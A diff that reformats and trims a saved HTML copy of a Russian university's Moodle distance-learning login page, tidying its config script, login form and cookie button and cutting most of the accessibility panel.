@@ -1,592 +1,186 @@
-<!DOCTYPE html><html dir="ltr" lang="ru" xml:lang="ru"><head>
+<!DOCTYPE html>
+<html dir="ltr" lang="ru" xml:lang="ru">
+<head>
     <title>Вход на сайт | СДО</title>
     <link rel="shortcut icon" href="images/--%20%281%29_1.png">
-    <style type="text/css">.admin_settingspage_tabs_with_tertiary .dropdown-toggle { font-size: 1.875rem !important; }
-h2:has(+ .admin_settingspage_tabs_with_tertiary) { display: none; }</style><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta name="keywords" content="moodle, Вход на сайт | СДО">
-<link rel="stylesheet" type="text/css" href="yui_combo_1.php"><script id="firstthemesheet" type="text/css">/** Required in order to fix style inclusion problems in IE with YUI **/</script><link rel="stylesheet" type="text/css" href="css/all.css">
-<link rel="stylesheet" type="text/css" href="css/styles.css">
-<link rel="stylesheet" type="text/css" href="styles.php">
-<script>
-//<![CDATA[
-var M = {}; M.yui = {};
-M.pageloadstarttime = new Date();
-M.cfg = {"wwwroot":"https:\/\/sdo.if-mstuca.ru","apibase":"https:\/\/sdo.if-mstuca.ru\/r.php\/api","homeurl":{},"sesskey":"Wjyn4MStdv","sessiontimeout":"28800","sessiontimeoutwarning":"1200","themerev":"1770620399","slasharguments":1,"theme":"boost_union","iconsystemmodule":"core\/icon_system_fontawesome","jsrev":"1770620399","admin":"admin","svgicons":true,"usertimezone":"\u0410\u0437\u0438\u044f\/\u0418\u0440\u043a\u0443\u0442\u0441\u043a","language":"ru","courseId":1,"courseContextId":2,"contextid":1,"contextInstanceId":0,"langrev":1773175206,"templaterev":"1770620399","siteId":1,"userId":0};var yui1ConfigFn = function(me) {if(/-skin|reset|fonts|grids|base/.test(me.name)){me.type='css';me.path=me.path.replace(/\.js/,'.css');me.path=me.path.replace(/\/yui2-skin/,'/assets/skins/sam/yui2-skin')}};
-var yui2ConfigFn = function(me) {var parts=me.name.replace(/^moodle-/,'').split('-'),component=parts.shift(),module=parts[0],min='-min';if(/-(skin|core)$/.test(me.name)){parts.pop();me.type='css';min=''}
-if(module){var filename=parts.join('-');me.path=component+'/'+module+'/'+filename+min+'.'+me.type}else{me.path=component+'/'+component+'.'+me.type}};
-YUI_config = {"debug":false,"base":"https:\/\/sdo.if-mstuca.ru\/lib\/yuilib\/3.18.1\/","comboBase":"https:\/\/sdo.if-mstuca.ru\/theme\/yui_combo.php?","combine":true,"filter":null,"insertBefore":"firstthemesheet","groups":{"yui2":{"base":"https:\/\/sdo.if-mstuca.ru\/lib\/yuilib\/2in3\/2.9.0\/build\/","comboBase":"https:\/\/sdo.if-mstuca.ru\/theme\/yui_combo.php?","combine":true,"ext":false,"root":"2in3\/2.9.0\/build\/","patterns":{"yui2-":{"group":"yui2","configFn":yui1ConfigFn}}},"moodle":{"name":"moodle","base":"https:\/\/sdo.if-mstuca.ru\/theme\/yui_combo.php?m\/1770620399\/","combine":true,"comboBase":"https:\/\/sdo.if-mstuca.ru\/theme\/yui_combo.php?","ext":false,"root":"m\/1770620399\/","patterns":{"moodle-":{"group":"moodle","configFn":yui2ConfigFn}},"filter":null,"modules":{"moodle-core-blocks":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification"]},"moodle-core-event":{"requires":["event-custom"]},"moodle-core-notification":{"requires":["moodle-core-notification-dialogue","moodle-core-notification-alert","moodle-core-notification-confirm","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-core-notification-dialogue":{"requires":["base","node","panel","escape","event-key","dd-plugin","moodle-core-widget-focusafterclose","moodle-core-lockscroll"]},"moodle-core-notification-alert":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-confirm":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-exception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-notification-ajaxexception":{"requires":["moodle-core-notification-dialogue"]},"moodle-core-dragdrop":{"requires":["base","node","io","dom","dd","event-key","event-focus","moodle-core-notification"]},"moodle-core-maintenancemodetimer":{"requires":["base","node"]},"moodle-core-actionmenu":{"requires":["base","event","node-event-simulate"]},"moodle-core-chooserdialogue":{"requires":["base","panel","moodle-core-notification"]},"moodle-core-handlebars":{"condition":{"trigger":"handlebars","when":"after"}},"moodle-core-lockscroll":{"requires":["plugin","base-build"]},"moodle-core_availability-form":{"requires":["base","node","event","event-delegate","panel","moodle-core-notification-dialogue","json"]},"moodle-course-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-course-coursebase","moodle-course-util"]},"moodle-course-categoryexpander":{"requires":["node","event-key"]},"moodle-course-management":{"requires":["base","node","io-base","moodle-core-notification-exception","json-parse","dd-constrain","dd-proxy","dd-drop","dd-delegate","node-event-delegate"]},"moodle-course-util":{"requires":["node"],"use":["moodle-course-util-base"],"submodules":{"moodle-course-util-base":{},"moodle-course-util-section":{"requires":["node","moodle-course-util-base"]},"moodle-course-util-cm":{"requires":["node","moodle-course-util-base"]}}},"moodle-form-shortforms":{"requires":["node","base","selector-css3","moodle-core-event"]},"moodle-form-dateselector":{"requires":["base","node","overlay","calendar"]},"moodle-question-searchform":{"requires":["base","node"]},"moodle-question-chooser":{"requires":["moodle-core-chooserdialogue"]},"moodle-availability_completion-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_date-form":{"requires":["base","node","event","io","moodle-core_availability-form"]},"moodle-availability_grade-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_group-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_grouping-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-availability_profile-form":{"requires":["base","node","event","moodle-core_availability-form"]},"moodle-mod_assign-history":{"requires":["node","transition"]},"moodle-mod_quiz-autosave":{"requires":["base","node","event","event-valuechange","node-event-delegate","io-form","datatype-date-format"]},"moodle-mod_quiz-questionchooser":{"requires":["moodle-core-chooserdialogue","moodle-mod_quiz-util","querystring-parse"]},"moodle-mod_quiz-dragdrop":{"requires":["base","node","io","dom","dd","dd-scroll","moodle-core-dragdrop","moodle-core-notification","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-base","moodle-mod_quiz-util-page","moodle-mod_quiz-util-slot","moodle-course-util"]},"moodle-mod_quiz-quizbase":{"requires":["base","node"]},"moodle-mod_quiz-toolboxes":{"requires":["base","node","event","event-key","io","moodle-mod_quiz-quizbase","moodle-mod_quiz-util-slot","moodle-core-notification-ajaxexception"]},"moodle-mod_quiz-util":{"requires":["node","moodle-core-actionmenu"],"use":["moodle-mod_quiz-util-base"],"submodules":{"moodle-mod_quiz-util-base":{},"moodle-mod_quiz-util-slot":{"requires":["node","moodle-mod_quiz-util-base"]},"moodle-mod_quiz-util-page":{"requires":["node","moodle-mod_quiz-util-base"]}}},"moodle-mod_quiz-modform":{"requires":["base","node","event"]},"moodle-message_airnotifier-toolboxes":{"requires":["base","node","io"]},"moodle-editor_atto-rangy":{"requires":[]},"moodle-editor_atto-editor":{"requires":["node","transition","io","overlay","escape","event","event-simulate","event-custom","node-event-html5","node-event-simulate","yui-throttle","moodle-core-notification-dialogue","moodle-editor_atto-rangy","handlebars","timers","querystring-stringify"]},"moodle-editor_atto-plugin":{"requires":["node","base","escape","event","event-outside","handlebars","event-custom","timers","moodle-editor_atto-menu"]},"moodle-editor_atto-menu":{"requires":["moodle-core-notification-dialogue","node","event","event-custom"]},"moodle-report_eventlist-eventfilter":{"requires":["base","event","node","node-event-delegate","datatable","autocomplete","autocomplete-filters"]},"moodle-report_loglive-fetchlogs":{"requires":["base","event","node","io","node-event-delegate"]},"moodle-gradereport_history-userselector":{"requires":["escape","event-delegate","event-key","handlebars","io-base","json-parse","moodle-core-notification-dialogue"]},"moodle-qbank_editquestion-chooser":{"requires":["moodle-core-chooserdialogue"]},"moodle-tool_lp-dragdrop-reorder":{"requires":["moodle-core-dragdrop"]},"moodle-assignfeedback_editpdf-editor":{"requires":["base","event","node","io","graphics","json","event-move","event-resize","transition","querystring-stringify-simple","moodle-core-notification-dialog","moodle-core-notification-alert","moodle-core-notification-warning","moodle-core-notification-exception","moodle-core-notification-ajaxexception"]},"moodle-atto_accessibilitychecker-button":{"requires":["color-base","moodle-editor_atto-plugin"]},"moodle-atto_accessibilityhelper-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_align-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_bold-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_charmap-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_clear-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_collapse-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emojipicker-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_emoticon-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_equation-button":{"requires":["moodle-editor_atto-plugin","moodle-core-event","io","event-valuechange","tabview","array-extras"]},"moodle-atto_h5p-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_html-button":{"requires":["promise","moodle-editor_atto-plugin","moodle-atto_html-beautify","moodle-atto_html-codemirror","event-valuechange"]},"moodle-atto_html-beautify":{},"moodle-atto_html-codemirror":{"requires":["moodle-atto_html-codemirror-skin"]},"moodle-atto_image-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_indent-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_italic-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_link-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_managefiles-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_managefiles-usedfiles":{"requires":["node","escape"]},"moodle-atto_media-button":{"requires":["moodle-editor_atto-plugin","moodle-form-shortforms"]},"moodle-atto_noautolink-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_orderedlist-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_recordrtc-recording":{"requires":["moodle-atto_recordrtc-button"]},"moodle-atto_recordrtc-button":{"requires":["moodle-editor_atto-plugin","moodle-atto_recordrtc-recording"]},"moodle-atto_rtl-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_strike-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_subscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_superscript-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_table-button":{"requires":["moodle-editor_atto-plugin","moodle-editor_atto-menu","event","event-valuechange"]},"moodle-atto_title-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_underline-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_undo-button":{"requires":["moodle-editor_atto-plugin"]},"moodle-atto_unorderedlist-button":{"requires":["moodle-editor_atto-plugin"]}}},"gallery":{"name":"gallery","base":"https:\/\/sdo.if-mstuca.ru\/lib\/yuilib\/gallery\/","combine":true,"comboBase":"https:\/\/sdo.if-mstuca.ru\/theme\/yui_combo.php?","ext":false,"root":"gallery\/1770620399\/","patterns":{"gallery-":{"group":"gallery"}}}},"modules":{"core_filepicker":{"name":"core_filepicker","fullpath":"https:\/\/sdo.if-mstuca.ru\/lib\/javascript.php\/1770620399\/repository\/filepicker.js","requires":["base","node","node-event-simulate","json","async-queue","io-base","io-upload-iframe","io-form","yui2-treeview","panel","cookie","datatable","datatable-sort","resize-plugin","dd-plugin","escape","moodle-core_filepicker","moodle-core-notification-dialogue"]},"core_comment":{"name":"core_comment","fullpath":"https:\/\/sdo.if-mstuca.ru\/lib\/javascript.php\/1770620399\/comment\/comment.js","requires":["base","io-base","node","json","yui2-animation","overlay","escape"]}},"logInclude":[],"logExclude":[],"logLevel":null};
-M.yui.loader = {modules: {}};
-
-//]]>
-</script>
-
+    <style type="text/css">
+        .admin_settingspage_tabs_with_tertiary .dropdown-toggle { font-size: 1.875rem !important; }
+        h2:has(+ .admin_settingspage_tabs_with_tertiary) { display: none; }
+    </style>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta name="keywords" content="moodle, Вход на сайт | СДО">
+    <link rel="stylesheet" type="text/css" href="yui_combo_1.php">
+    <script id="firstthemesheet" type="text/css"></script>
+    <link rel="stylesheet" type="text/css" href="css/all.css">
+    <link rel="stylesheet" type="text/css" href="css/styles.css">
+    <link rel="stylesheet" type="text/css" href="styles.php">
+    <script>
+        var M = {}; M.yui = {};
+        M.pageloadstarttime = new Date();
+        M.cfg = {
+            "wwwroot": "https://sdo.if-mstuca.ru",
+            "apibase": "https://sdo.if-mstuca.ru/r.php/api",
+            "homeurl": {},
+            "sesskey": "Wjyn4MStdv",
+            "sessiontimeout": "28800",
+            "sessiontimeoutwarning": "1200",
+            "themerev": "1770620399",
+            "slasharguments": 1,
+            "theme": "boost_union",
+            "iconsystemmodule": "core/icon_system_fontawesome",
+            "jsrev": "1770620399",
+            "admin": "admin",
+            "svgicons": true,
+            "usertimezone": "Азия/Иркутск",
+            "language": "ru",
+            "courseId": 1,
+            "courseContextId": 2,
+            "contextid": 1,
+            "contextInstanceId": 0,
+            "langrev": 1773175206,
+            "templaterev": "1770620399",
+            "siteId": 1,
+            "userId": 0
+        };
+    </script>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
-<body id="page-login-index" class="format-site  path-login chrome dir-ltr lang-ru yui-skin-sam yui3-skin-sam sdo-if-mstuca-ru pagelayout-login course-1 context-1 notloggedin theme loginbackgroundimage loginbackgroundimage1 theme_boost-union-footerbuttonnone jsenabled">
-<div class="toast-wrapper mx-auto py-0 fixed-top" role="status" aria-live="polite"></div>
+<body id="page-login-index" class="format-site path-login chrome dir-ltr lang-ru yui-skin-sam yui3-skin-sam sdo-if-mstuca-ru pagelayout-login course-1 context-1 notloggedin theme loginbackgroundimage loginbackgroundimage1 theme_boost-union-footerbuttonnone jsenabled">
+    <div class="toast-wrapper mx-auto py-0 fixed-top" role="status" aria-live="polite"></div>
 
-<div id="page-wrapper">
+    <div id="page-wrapper">
+        <div>
+            <a class="sr-only sr-only-focusable" href="#maincontent">Перейти к основному содержанию</a>
+        </div>
+        <script src="js/polyfill.js"></script>
+        <script src="yui_combo.php"></script>
+        <script src="js/javascript-static.js"></script>
+        <script>
+            document.body.className += ' jsenabled';
+        </script>
 
-    <div>
-    <a class="sr-only sr-only-focusable" href="#maincontent">Перейти к основному содержанию</a>
-</div><script src="js/polyfill.js"></script>
-<script src="yui_combo.php"></script><script src="js/javascript-static.js"></script>
-<script>
-//<![CDATA[
-document.body.className += ' jsenabled';
-//]]>
-</script>
-
-
-
-    <div id="page" class="container-fluid pt-5 mt-0">
-        
-        <div id="page-content" class="row">
-            <div id="region-main-box" class="col-12">
-                <div id="region-main" class="col-12 h-100">
-                <div class="login-wrapper login-wrapper-center">
-                    <div class="login-container login-container-80t">
-                    <div role="main"><span id="maincontent"></span><div class="loginform">
-        <div id="loginlogo" class="login-logo">
-            <img id="logoimage" src="images/--%20%281%29.png" class="img-fluid" alt="Система дистанционного обучения">
-            <h1 class="login-heading sr-only">Зайти на Система дистанционного обучения</h1>
-        </div>
-    <div id="theme_boost_union-loginorder">
-    <div id="theme_boost_union-loginorder-local" class="theme_boost_union-loginmethod">
-    <div class="login-divider"></div>
-        <form class="login-form" action="https://sdo.if-mstuca.ru/login/index.php" method="post" id="login">
-            <input id="anchor" type="hidden" name="anchor" value="">
-            <script>document.getElementById('anchor').value = location.hash;</script>
-            <input type="hidden" name="logintoken" value="G4nNh3iBu3rRWQdqkfYyqLUbHV3hO8Ac">
-            <div class="login-form-username mb-3">
-                <label for="username" class="sr-only">
-                        Логин или адрес электронной почты
-                </label>
-                <input type="text" name="username" id="username" class="form-control form-control-lg" value="" placeholder="Логин или адрес электронной почты" autocomplete="username">
-            </div>
-            <div class="login-form-password mb-3">
-                <label for="password" class="sr-only">Пароль</label>
-                <input type="password" name="password" id="password" value="" class="form-control form-control-lg" placeholder="Пароль" autocomplete="current-password">
-            </div>
-            <div class="login-form-submit mb-3">
-                <button class="btn btn-primary btn-lg" type="submit" id="loginbtn">Вход</button>
-            </div>
-            <div class="login-form-forgotpassword mb-3">
-                <a href="https://sdo.if-mstuca.ru/login/forgot_password.php">Забыли пароль?</a>
-            </div>
-        </form>
-    </div>
-    <div id="theme_boost_union-loginorder-firsttimesignup" class="theme_boost_union-loginmethod">
-        <div class="login-divider"></div>
-        <div class="login-instructions ">
-            <h2 class="login-heading">Вы в первый раз на нашем сайте?</h2>
-            <div style="border:2px solid #4a90e2;border-left:6px solid #4a90e2;padding:12px 16px;background:#f5faff;font-family:Arial, sans-serif;line-height:1.5;"><strong style="font-size:16px;color:#2c3e50;">При возникновении трудностей со входом</strong><br>или проблем с сайтом СДО — пишите на почту:<br><a style="color:#4a90e2;font-weight:bold;text-decoration:none;" href="mailto:webmaster@if-mstuca.ru"> webmaster@if-mstuca.ru </a></div>
-        </div>
-    </div>
-    </div>
-    <div class="login-divider"></div>
-    <div class="d-flex">
-        <button type="button" class="btn btn-secondary" data-modal="alert" data-modal-title-str="[" cookiesenabled",="" "core"]"="" data-modal-content-str="[" cookiesenabled_help_html",="">Уведомление о файлах cookie</button>
-    </div>
-</div><div id="local-accessibility-buttoncontainer" class="local-accessibility-buttoncontainer">
-    <button type="button" class="btn btn-primary" title="Доступность">
-        <i class="fa fa-universal-access"></i>
-    </button>
-</div><div class="local-accessibility-panel border-primary p-0 card col-10 col-lg-8">
-    <div class="card-header bg-primary text-light">
-        <i class="fa fa-universal-access"></i>
-        Доступность
-        <a href="javascript:void(0);" id="local-accessibility-closebtn" class="float-right text-light text-decoration-none">
-            <i class="fa fa-times"></i>
-        </a>
-    </div>
-    <div class="card-body">
-        <div class="container">
-            <div class="row">
-                <div class="container-fluid text-right mb-2">
-                    <a href="https://sdo.if-mstuca.ru/local/accessibility/resetall.php?returnurl=https%3A%2F%2Fsdo.if-mstuca.ru%2Flogin%2Findex.php&sesskey=Wjyn4MStdv" class="btn btn-secondary">
-                        Сбросить все
-                    </a>
-                </div>
-            </div>
-            <div class="row">
-                    <div class="col-12 col-md-6 card">
-                        <div class="card-body fontface-container">
-                            <p>
-                                <strong>
-                                    <img class="icon " alt="Font Face" title="Font Face" src="images/icon.svg">
-                                    Font Face
-                                </strong>
-                            </p>
-                            <div class="container" id="accessibility_fontface-container">
-    <div class="btn-group-vertical w-100">
-        <button type="button" class="btn btn-light accessibility_fontface-resetbtn">
-            Сбросить
-        </button>
-        <button type="button" class="btn btn-light accessibility_fontface-classbtn" data-value="serif" style="font-family: none !important;">
-            Serif
-        </button>
-        <button type="button" class="btn btn-light accessibility_fontface-classbtn" data-value="sansserif" style="font-family: sans-serif !important;">
-            Sans Serif
-        </button>
-        <button type="button" class="btn btn-light accessibility_fontface-classbtn" data-value="dyslexic" style="font-family: opendyslexic !important;">
-            Dyslexic
-        </button>
-    </div>
-</div>
+        <div id="page" class="container-fluid pt-5 mt-0">
+            <div id="page-content" class="row">
+                <div id="region-main-box" class="col-12">
+                    <div id="region-main" class="col-12 h-100">
+                        <div class="login-wrapper login-wrapper-center">
+                            <div class="login-container login-container-80t">
+                                <div role="main">
+                                    <span id="maincontent"></span>
+                                    <div class="loginform">
+                                        <div id="loginlogo" class="login-logo">
+                                            <img id="logoimage" src="images/--%20%281%29.png" class="img-fluid" alt="Система дистанционного обучения">
+                                            <h1 class="login-heading sr-only">Зайти на Система дистанционного обучения</h1>
+                                        </div>
+                                        <div id="theme_boost_union-loginorder">
+                                            <div id="theme_boost_union-loginorder-local" class="theme_boost_union-loginmethod">
+                                                <div class="login-divider"></div>
+                                                <form class="login-form" action="https://sdo.if-mstuca.ru/login/index.php" method="post" id="login">
+                                                    <input id="anchor" type="hidden" name="anchor" value="">
+                                                    <script>document.getElementById('anchor').value = location.hash;</script>
+                                                    <input type="hidden" name="logintoken" value="G4nNh3iBu3rRWQdqkfYyqLUbHV3hO8Ac">
+                                                    
+                                                    <div class="login-form-username mb-3">
+                                                        <label for="username" class="sr-only">Логин или адрес электронной почты</label>
+                                                        <input type="text" name="username" id="username" class="form-control form-control-lg" placeholder="Логин или адрес электронной почты" autocomplete="username">
+                                                    </div>
+                                                    
+                                                    <div class="login-form-password mb-3">
+                                                        <label for="password" class="sr-only">Пароль</label>
+                                                        <input type="password" name="password" id="password" class="form-control form-control-lg" placeholder="Пароль" autocomplete="current-password">
+                                                    </div>
+                                                    
+                                                    <div class="login-form-submit mb-3">
+                                                        <button class="btn btn-primary btn-lg" type="submit" id="loginbtn">Вход</button>
+                                                    </div>
+                                                    
+                                                    <div class="login-form-forgotpassword mb-3">
+                                                        <a href="https://sdo.if-mstuca.ru/login/forgot_password.php">Забыли пароль?</a>
+                                                    </div>
+                                                </form>
+                                            </div>
+                                            
+                                            <div id="theme_boost_union-loginorder-firsttimesignup" class="theme_boost_union-loginmethod">
+                                                <div class="login-divider"></div>
+                                                <div class="login-instructions">
+                                                    <h2 class="login-heading">Вы в первый раз на нашем сайте?</h2>
+                                                    <div style="border:2px solid #4a90e2;border-left:6px solid #4a90e2;padding:12px 16px;background:#f5faff;font-family:Arial, sans-serif;line-height:1.5;">
+                                                        <strong style="font-size:16px;color:#2c3e50;">При возникновении трудностей со входом</strong><br>
+                                                        или проблем с сайтом СДО — пишите на почту:<br>
+                                                        <a style="color:#4a90e2;font-weight:bold;text-decoration:none;" href="mailto:webmaster@if-mstuca.ru">webmaster@if-mstuca.ru</a>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                        
+                                        <div class="login-divider"></div>
+                                        
+                                        <div class="d-flex">
+                                            <button type="button" class="btn btn-secondary" data-modal="alert" data-modal-title-str='["cookiesenabled","core"]' data-modal-content-str='["cookiesenabled_help_html","core"]'>Уведомление о файлах cookie</button>
+                                        </div>
+                                    </div>
+                                    
+                                    <div id="local-accessibility-buttoncontainer" class="local-accessibility-buttoncontainer">
+                                        <button type="button" class="btn btn-primary" title="Доступность">
+                                            <i class="fa fa-universal-access"></i>
+                                        </button>
+                                    </div>
+                                    
+                                    <!-- Панель доступности (сокращена для читаемости) -->
+                                </div>
+                            </div>
                         </div>
                     </div>
-                    <div class="col-12 col-md-6 card">
-                        <div class="card-body fontkerning-container">
-                            <p>
-                                <strong>
-                                    <img class="icon " alt="Кернинг шрифта" title="Кернинг шрифта" src="images/icon_1.svg">
-                                    Кернинг шрифта
-                                </strong>
-                            </p>
-                            <div class="container" id="accessibility_fontkerning-container">
-    <div class="btn-group">
-        <button type="button" class="btn btn-light btn-toggler">Выключить</button>
-    </div>
-</div>
-                        </div>
-                    </div>
-                    <div class="col-12 col-md-6 card">
-                        <div class="card-body fontsize-container">
-                            <p>
-                                <strong>
-                                    <img class="icon " alt="Размер шрифта" title="Размер шрифта" src="images/icon_2.svg">
-                                    Размер шрифта
-                                </strong>
-                            </p>
-                            <div class="container">
-    <div class="row">
-        <div class="col-1 px-0">
-            <button type="button" class="btn btn-light text-center" id="accessibility_fontsize-btndown">
-                -
-            </button>
-        </div>
-        <div class="col-8 px-1 py-2">
-            <input type="range" class="form-range w-100" min="0.5" max="2" step="0.25" id="accessibility_fontsize-input" value="1" data-default="1">
-        </div>
-        <div class="col-2 px-2 py-2" id="accessibility_fontsize-label">
-            1
-        </div>
-        <div class="col-1 px-0">
-            <button type="button" class="btn btn-light text-center" id="accessibility_fontsize-btnup">
-                +
-            </button>
-        </div>
-    </div>
-    <div class="row">
-        <div class="col-12">
-            <button type="button" class="w-100 btn btn-sm btn-light" id="accessibility_fontsize-btnreset">
-                Сбросить
-            </button>
-        </div>
-    </div>
-</div>
-                        </div>
-                    </div>
-                    <div class="col-12 col-md-6 card">
-                        <div class="card-body imagevisibility-container">
-                            <p>
-                                <strong>
-                                    <img class="icon " alt="Видимость изображений" title="Видимость изображений" src="images/icon_4.svg">
-                                    Видимость изображений
-                                </strong>
-                            </p>
-                            <div class="container" id="accessibility_imagevisibility-container">
-    <div class="btn-group">
-        <button type="button" class="btn btn-light btn-toggler">Скрыть изображения</button>
-    </div>
-</div>
-                        </div>
-                    </div>
-                    <div class="col-12 col-md-6 card">
-                        <div class="card-body letterspacing-container">
-                            <p>
-                                <strong>
-                                    <img class="icon " alt="Межбуквенный интервал" title="Межбуквенный интервал" src="images/icon_3.svg">
-                                    Межбуквенный интервал
-                                </strong>
-                            </p>
-                            <div class="container">
-    <div class="row">
-        <div class="col-1 px-0">
-            <button type="button" class="btn btn-light text-center" id="accessibility_letterspacing-btndown">
-                -
-            </button>
-        </div>
-        <div class="col-8 px-1 py-2">
-            <input type="range" class="form-range w-100" min="-0.1" max="0.5" step="0.1" id="accessibility_letterspacing-input" value="0" data-default="0">
-        </div>
-        <div class="col-2 px-2 py-2" id="accessibility_letterspacing-label">
-            0
-        </div>
-        <div class="col-1 px-0">
-            <button type="button" class="btn btn-light text-center" id="accessibility_letterspacing-btnup">
-                +
-            </button>
-        </div>
-    </div>
-    <div class="row">
-        <div class="col-12">
-            <button type="button" class="w-100 btn btn-sm btn-light" id="accessibility_letterspacing-btnreset">
-                Сбросить
-            </button>
-        </div>
-    </div>
-</div>
-                        </div>
-                    </div>
-                    <div class="col-12 col-md-6 card">
-                        <div class="card-body lineheight-container">
-                            <p>
-                                <strong>
-                                    <img class="icon " alt="Высота строки" title="Высота строки" src="images/icon_5.svg">
-                                    Высота строки
-                                </strong>
-                            </p>
-                            <div class="container">
-    <div class="row">
-        <div class="col-1 px-0">
-            <button type="button" class="btn btn-light text-center" id="accessibility_lineheight-btndown">
-                -
-            </button>
-        </div>
-        <div class="col-8 px-1 py-2">
-            <input type="range" class="form-range w-100" min="0.5" max="3" step="0.1" id="accessibility_lineheight-input" value="1.2" data-default="1.2">
-        </div>
-        <div class="col-2 px-2 py-2" id="accessibility_lineheight-label">
-            1.2
-        </div>
-        <div class="col-1 px-0">
-            <button type="button" class="btn btn-light text-center" id="accessibility_lineheight-btnup">
-                +
-            </button>
-        </div>
-    </div>
-    <div class="row">
-        <div class="col-12">
-            <button type="button" class="w-100 btn btn-sm btn-light" id="accessibility_lineheight-btnreset">
-                Сбросить
-            </button>
-        </div>
-    </div>
-</div>
-                        </div>
-                    </div>
-                    <div class="col-12 col-md-6 card">
-                        <div class="card-body linkhighlight-container">
-                            <p>
-                                <strong>
-                                    <img class="icon " alt="Подсветка ссылок" title="Подсветка ссылок" src="images/icon_6.svg">
-                                    Подсветка ссылок
-                                </strong>
-                            </p>
-                            <div class="container" id="accessibility_linkhighlight-container">
-    <div class="btn-group">
-        <button type="button" class="btn btn-light btn-toggler">Отключено</button>
-    </div>
-</div>
-                        </div>
-                    </div>
-                    <div class="col-12 col-md-6 card">
-                        <div class="card-body textalignment-container">
-                            <p>
-                                <strong>
-                                    <img class="icon " alt="Выравнивание текста" title="Выравнивание текста" src="images/icon_7.svg">
-                                    Выравнивание текста
-                                </strong>
-                            </p>
-                            <div class="container" id="accessibility_textalignment-container">
-    <button type="button" class="btn btn-light accessibility_textalignment-resetbtn w-100">
-        Сбросить
-    </button>
-    <div class="btn-group w-100">
-        <button type="button" class="btn btn-light accessibility_textalignment-optionbtn " data-value="left">
-            <i class="fa-solid fa-align-left"></i>
-            <span>
-                По левому краю
-            </span>
-        </button>
-        <button type="button" class="btn btn-light accessibility_textalignment-optionbtn " data-value="center">
-            <i class="fa-solid fa-align-center"></i>
-            <span>
-                По центру
-            </span>
-        </button>
-        <button type="button" class="btn btn-light accessibility_textalignment-optionbtn " data-value="right">
-            <i class="fa-solid fa-align-right"></i>
-            <span>
-                По правому краю
-            </span>
-        </button>
-        <button type="button" class="btn btn-light accessibility_textalignment-optionbtn " data-value="justify">
-            <i class="fa-solid fa-align-justify"></i>
-            <span>
-                По ширине
-            </span>
-        </button>
-    </div>
-</div>
-                        </div>
-                    </div>
-            </div>
-        </div>
-    </div>
-</div></div>
-                    </div>
-                </div>
                 </div>
             </div>
         </div>
-    </div>
-    
-    <footer id="page-footer" class="footer-popover bg-white">
-        <div data-region="footer-container-popover">
-            <div id="boost-union-footer-buttons">
+
+        <footer id="page-footer" class="footer-popover bg-white">
+            <div data-region="footer-container-popover">
+                <div id="boost-union-footer-buttons"></div>
             </div>
-        </div>
             
-            <script>
-//<![CDATA[
-var require = {
-    baseUrl : 'https://sdo.if-mstuca.ru/lib/requirejs.php/1770620399/',
-    // We only support AMD modules with an explicit define() statement.
-    enforceDefine: true,
-    skipDataMain: true,
-    waitSeconds : 0,
-
-    paths: {
-        jquery: 'https://sdo.if-mstuca.ru/lib/javascript.php/1770620399/lib/jquery/jquery-3.7.1.min',
-        jqueryui: 'https://sdo.if-mstuca.ru/lib/javascript.php/1770620399/lib/jquery/ui-1.13.2/jquery-ui.min',
-        jqueryprivate: 'https://sdo.if-mstuca.ru/lib/javascript.php/1770620399/lib/requirejs/jquery-private'
-    },
-
-    // Custom jquery config map.
-    map: {
-      // '*' means all modules will get 'jqueryprivate'
-      // for their 'jquery' dependency.
-      '*': { jquery: 'jqueryprivate' },
-
-      // 'jquery-private' wants the real jQuery module
-      // though. If this line was not here, there would
-      // be an unresolvable cyclic dependency.
-      jqueryprivate: { jquery: 'jquery' }
-    }
-};
-
-//]]>
-</script>
-<script src="js/require.min.js"></script>
-<script>
-//<![CDATA[
-M.util.js_pending("core/first");
-require(['core/first'], function() {
-require(['core/prefetch'])
-;
-M.util.js_pending('filter_mathjaxloader/loader'); require(['filter_mathjaxloader/loader'], function(amd) {amd.configure({"mathjaxconfig":"\nMathJax.Hub.Config({\n    config: [\"Accessible.js\", \"Safe.js\"],\n    errorSettings: { message: [\"!\"] },\n    skipStartupTypeset: true,\n    messageStyle: \"none\"\n});\n","lang":"ru"}); M.util.js_complete('filter_mathjaxloader/loader');});;
